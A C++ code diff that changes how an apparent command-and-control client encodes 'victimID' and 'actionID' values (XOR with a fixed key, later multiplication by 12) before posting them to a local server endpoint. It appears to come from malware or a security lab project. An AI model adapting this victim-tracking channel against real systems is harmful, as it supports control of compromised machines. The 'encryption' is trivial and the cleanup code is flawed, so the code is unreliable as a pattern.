@@ -108,8 +108,16 @@ public:
             CURLcode res;
             curl_global_init(CURL_GLOBAL_DEFAULT);
             curl = curl_easy_init();
+
+            if (actionID != "10") {
+                actionID = XOR(actionID, "S12Secret");
+            }
+            else {
+				actionID = "10Special";
+            }
+
             victimID = XOR(victimID, "S12Secret");
-            actionID = XOR(actionID, "S12Secret");
+            
 
             if (curl) {
                 curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5068/Action/DoAction");
@@ -141,53 +149,58 @@ public:
             }
         }
 
-    //string httpGetParamsAction(string victimID, string actionID) {
-    //    httpRequest http = httpRequest();
-    //    string XappTimestamp = http.createTimeStamp();
-    //    string XAppSignature = http.createSignature("/Action/DoAction");
+        string httpGetParams(string victimID, string actionID) {
+            httpRequest http = httpRequest();
+            string XappTimestamp = http.createTimeStamp();
+            string XAppSignature = http.createSignature("/Action/SecretOperation");
 
-    //    // XAppSignature
-    //    CURL* curl;
-    //    CURLcode res;
-    //    curl_global_init(CURL_GLOBAL_DEFAULT);
-    //    curl = curl_easy_init();
+            // XAppSignature
+            CURL* curl;
+            CURLcode res;
+            curl_global_init(CURL_GLOBAL_DEFAULT);
+            curl = curl_easy_init();
 
-    //    // Encrypting parameters with XOR
-    //    victimID = XOR(victimID, "S12Secret");
-    //    actionID = XOR(actionID, "S12Secret");
+            if (actionID != "10") {
+                actionID = secretOperation(actionID);
+            }
+            else {
+                actionID = "10Special";
+            }
 
-    //    if (curl) {
-    //        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5068/Action/DoAction");
-    //        curl_easy_setopt(curl, CURLOPT_POST, 1L);
+            victimID = secretOperation(victimID);
 
-    //        struct curl_slist* headers = NULL;
-    //        headers = curl_slist_append(headers, "Content-Type: application/json");
-    //        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
-    //        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
 
-    //        // Encrypting headers with XOR
-    //        headers = curl_slist_append(headers, ("X-App-Timestamp: " + XOR(XappTimestamp, "S12Secret")).c_str());
-    //        headers = curl_slist_append(headers, ("X-App-Signature: " + XOR(XAppSignature, "S12Secret")).c_str());
-    //        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+            if (curl) {
+                curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5068/Action/SecretOperation");
+                curl_easy_setopt(curl, CURLOPT_POST, 1L);
 
-    //        const char* id_cstr = victimID.c_str();
-    //        const char* action_cstr = actionID.c_str();
+                struct curl_slist* headers = NULL;
+                headers = curl_slist_append(headers, "Content-Type: application/json");
+                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+                curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
 
-    //        char post_data[256];
-    //        snprintf(post_data, sizeof(post_data), "{\"victimID\":\"%s\",\"actionID\":\"%s\"}", id_cstr, action_cstr);
+                headers = curl_slist_append(headers, ("X-App-Timestamp: " + XappTimestamp).c_str());
+                headers = curl_slist_append(headers, ("X-App-Signature: " + XAppSignature).c_str());
+                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
 
-    //        // Encrypting post data with XOR
-    //        string encrypted_post_data = XOR(post_data, "S12Secret");
-    //        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, encrypted_post_data.c_str());
-    //        string response_data;
-    //        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, http.WriteCallback);
-    //        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
-    //        res = curl_easy_perform(curl);
-    //        curl_global_cleanup();
-    //        curl_easy_cleanup(curl);
-    //        return response_data;
-    //    }
-    //}
+                const char* id_cstr = victimID.c_str();
+                const char* action_cstr = actionID.c_str();
+
+                char post_data[256];
+                snprintf(post_data, sizeof(post_data), "{\"id\":\"%s\",\"actionID\":\"%s\"}", id_cstr, action_cstr);
+
+                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
+                string response_data;
+                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, http.WriteCallback);
+                curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
+                res = curl_easy_perform(curl);
+                curl_global_cleanup();
+                curl_easy_cleanup(curl);
+                return response_data;
+            }
+        }
+
+
 	
 private:
     static string XOR(string data, string key) {
@@ -197,4 +210,13 @@ private:
 		}
 		return output;
 	}
+
+    static string secretOperation(string data) {
+        int dataInt = stoi(data);
+		return to_string(dataInt * 12);
+	}
+
+    
+
+    
 };
